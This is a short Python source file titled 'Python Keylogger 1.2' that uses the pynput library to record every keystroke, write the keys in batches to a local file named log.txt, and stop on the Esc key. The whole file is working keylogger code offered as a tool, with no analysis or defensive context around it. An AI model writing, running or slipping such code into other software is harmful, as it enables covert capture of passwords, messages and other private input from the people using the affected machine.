#  __    ____  __   
# |  | _/_   |/  |_ 
# |  |/ /|   \   __\
# |    < |   ||  |  
# |__|_ \|___||__|  
#      \/           
#
## Python Keylogger 1.2

import pynput
from pynput.keyboard import Key, Listener

# Start count
count = 0
# Establish array
keys = []

# Log keys pressed
def on_press(key):
    global keys, count

    keys.append(key)
    count+= 1
    #print("{0}pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# Log to file 
def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'","") 
            # Listen for space, if used insert new line
            if k.find("space") > 0:
                f.write('\n')
            # If not a space, insert key as normal    
            elif k.find("Key") == -1:
                f.write(k)

# Exit logging
def on_release(key):
    if key == Key.esc:
        return False

# Functions called on press and release
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()